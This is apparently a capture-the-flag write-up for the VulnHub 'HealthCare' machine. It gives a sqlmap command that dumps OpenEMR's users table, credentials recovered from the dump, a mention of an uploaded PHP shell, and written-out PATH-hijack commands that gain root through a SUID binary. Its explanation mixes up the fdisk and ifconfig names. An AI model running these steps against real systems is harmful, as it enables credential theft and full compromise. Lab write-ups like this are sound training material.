---
layout : post
title: HealthCare
image : HealthCare.png
date: 2021-03-01 04:43 EST

tags: [sqlmap,PathHijacking Linux,php File Upload]
---

# Nmap

```
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2
MAC Address: 08:00:27:12:B9:5A (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

```
# Enumeration

<h3>Gobuster</h3>

![]({{site.baseurl}}/img/vulnhub/EVM1/gobutser.png)

found openemr // lead to sql injection at login page 

# Exploitation 

```
sqlmap -u http://10.0.2.37/openemr/interface/login/validateUser.php?u=admin -D openemr -T users --dump

```

![]({{site.baseurl}}/img/vulnhub/EVM1/sqlmap.png)

from `sql creds` , logged into `ftp`

```
medical : medical 
ackbar : admin 
```

![]({{site.baseurl}}/img/vulnhub/EVM1/ftp.png)

uploaded php shell into `var/www/` folder 

got reverseShell 

# Privilage Esclation 

from suid , healthChecker is executing the fdisk , ipconfig without path 

![]({{site.baseurl}}/img/vulnhub/EVM1/suid.png)

can override the  `ifconfig` , path 

The program is vulnerable because we control the PATH and the program doesn’t use the absolute path to execute the programs so we can execute anything we want as root. To get root I’ll just create a script that sets the SUID bit on /bin/bash, name it fdisk and call /usr/bin/healthcheck after setting the path to my current directory so it doesn’t execute the real fdisk program but my own script

```bash
cd /tmp 

echo "/bin/bash" > ifconfig

chmod +x ifconfig

export PATH=/tmp:$PATH

/usr/bin/healthcheck

//got root access

```



![]({{site.baseurl}}/img/vulnhub/EVM1/root.png)